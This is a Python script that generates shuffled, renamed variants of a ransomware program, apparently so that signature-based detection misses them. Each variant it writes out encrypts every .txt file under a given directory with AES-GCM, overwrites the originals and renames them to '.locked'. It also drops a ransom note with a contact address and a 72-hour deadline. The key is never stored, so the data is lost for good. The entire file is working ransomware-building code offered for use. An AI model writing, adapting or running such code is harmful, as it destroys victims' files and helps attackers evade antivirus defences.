import random
import string
from pathlib import Path

# -- Metamorphic generator --
def create_metamorphic_variant(filename="metamorphic_variant.py"):
    # Random variable and function names
    fn1 = ''.join(random.choices(string.ascii_lowercase, k=8))
    fn2 = ''.join(random.choices(string.ascii_lowercase, k=8))
    fn3 = ''.join(random.choices(string.ascii_lowercase, k=8))
    fn4 = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_nonce = ''.join(random.choices(string.ascii_lowercase, k=6))
    var_aes = ''.join(random.choices(string.ascii_lowercase, k=6))
    note_file = ''.join(random.choices(string.ascii_uppercase, k=5)) + "_ransom.txt"

    # Choose between two functionally equivalent encryption implementations
    encrypt_code = random.choice([
        f"{var_aes} = AESGCM(key)\n    {var_nonce} = os.urandom(12)",
        f"{var_nonce} = os.urandom(12)\n    {var_aes} = AESGCM(key)"
    ])
    
    # Shuffle order of functions
    funcs = [
        f'''
def {fn1}():
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = AESGCM.generate_key(bit_length=256)
    {encrypt_code}
    return {var_aes}, {var_nonce}
''',
        f'''
def {fn2}(text):
    import os
    locked_path = text.with_suffix(text.suffix + ".locked")
    text.rename(locked_path)
''',
        f'''
def {fn3}(target_path):
    ransom_note_path = target_path / "{note_file}"
    ransom_note = (
        "All your important files have been encrypted.",
        "Contact: [ransom_email@example.com]",
        "You have 72 hours to comply.",
        "This is not a joke."
    )
    ransom_note_text = "\\n".join(ransom_note)
    ransom_note_path.write_text(ransom_note_text)
''',
        f'''
def {fn4}(target_path):
    aes, nonce = {fn1}()
    for text in target_path.rglob("*.txt"):
        buffer = text.read_bytes()
        ciphertext = aes.encrypt(nonce, buffer, None)
        text.write_bytes(ciphertext)
        {fn2}(text)
'''
    ]
    random.shuffle(funcs)

    main_code = f'''
import sys
from pathlib import Path

{"".join(funcs)}

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {{sys.argv[0]}} <target_directory>")
        sys.exit(1)
    target_directory = Path(sys.argv[1])
    target_directory.mkdir(parents=True, exist_ok=True)
    {fn4}(target_directory)
    {fn3}(target_directory)
'''

    with open(filename, "w") as f:
        f.write(main_code)
    print(f"Metamorphic variant written to {filename}")

if __name__ == "__main__":
    create_metamorphic_variant()
